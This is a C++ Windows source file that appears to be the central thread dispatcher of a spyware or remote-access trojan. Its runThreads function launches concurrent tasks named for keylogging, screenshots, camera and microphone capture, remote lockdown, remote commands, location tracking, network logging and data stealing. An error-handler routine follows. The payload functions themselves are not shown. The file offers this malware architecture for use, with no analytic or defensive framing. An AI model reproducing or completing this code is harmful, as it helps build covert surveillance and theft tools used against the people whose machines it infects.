#include "TaskManagement.h"

int runThreads()
{
	const int numThreads = 12;
	PMYDATA pDataArray[numThreads];
	DWORD dwThreadIdArray[numThreads];
	HANDLE hThread[numThreads];

	for (int i = 0; i < numThreads; i++)
	{
		// Allocate additional data for the threads.. 
		// [Not used at the moment]
		pDataArray[i] = (PMYDATA)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(MYDATA));
		LPTHREAD_START_ROUTINE task = {};
		// Set a task for each thread in a loop
		switch (i)
		{
		case 0:
		{
			task = initConfig;
			break;
		}
		case 1:
		{
			task = initKeylogger;
			break;
		}
		case 2:
		{
			task = initScreenshot;
			break;
		}
		case 3:
		{
			task = initCamera;
			break;
		}
		case 4:
		{
			task = initMic;
			break;
		}
		case 5:
		{
			task = initRemoteLockdown;
			break;
		}
		case 6:
		{
			task = initRemoteCommands;
			break;
		}
		case 7:
		{
			task = initDataManager;
			break;
		}
		case 8:
		{
			task = initRequestManager;
			break;
		}
		case 9:
		{
			task = initLocationTracker;
			break;
		}
		case 10:
		{
			task = initNetLogger;
			break;
		}
		case 11:
		{
			task = initDataStealer;
			break;
		}
		default:
			break;
		}
		// Create a thread for each task according to the current case..
		hThread[i] = CreateThread(NULL, 0, task, pDataArray[i], 0, &dwThreadIdArray[i]);

		if (hThread[i] == NULL)
		{
			//   ErrorHandler(TEXT("CreateThread"));
			ExitProcess(3);
		}
	}

	// Wait until all threads have terminated.
	WaitForMultipleObjects(numThreads, hThread, TRUE, INFINITE);

	// Close all thread handles and free memory allocations.
	for (int i = 0; i < numThreads; i++)
	{
		CloseHandle(hThread[i]);
		if (pDataArray[i] != NULL)
		{
			HeapFree(GetProcessHeap(), 0, pDataArray[i]);
			pDataArray[i] = NULL; // Ensure address is not reused.
		}
	}
	return 0;
}

void ErrorHandler(LPTSTR lpszFunction)
{
	// Retrieve the system error message for the last-error code.
	LPVOID lpMsgBuf;
	LPVOID lpDisplayBuf;
	DWORD dw = GetLastError();

	FormatMessage(
		FORMAT_MESSAGE_ALLOCATE_BUFFER |
		FORMAT_MESSAGE_FROM_SYSTEM |
		FORMAT_MESSAGE_IGNORE_INSERTS,
		NULL,
		dw,
		MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
		(LPTSTR)&lpMsgBuf,
		0, NULL);

	// Display the error message.

	lpDisplayBuf = (LPVOID)LocalAlloc(LMEM_ZEROINIT,
		(lstrlen((LPCTSTR)lpMsgBuf) + lstrlen((LPCTSTR)lpszFunction) + 40) * sizeof(TCHAR));
	StringCchPrintf((LPTSTR)lpDisplayBuf,
		LocalSize(lpDisplayBuf) / sizeof(TCHAR),
		TEXT("%s failed with error %d: %s"),
		lpszFunction, dw, lpMsgBuf);
	MessageBox(NULL, (LPCTSTR)lpDisplayBuf, TEXT("Error"), MB_OK);

	// Free error-handling buffer allocations.

	LocalFree(lpMsgBuf);
	LocalFree(lpDisplayBuf);
}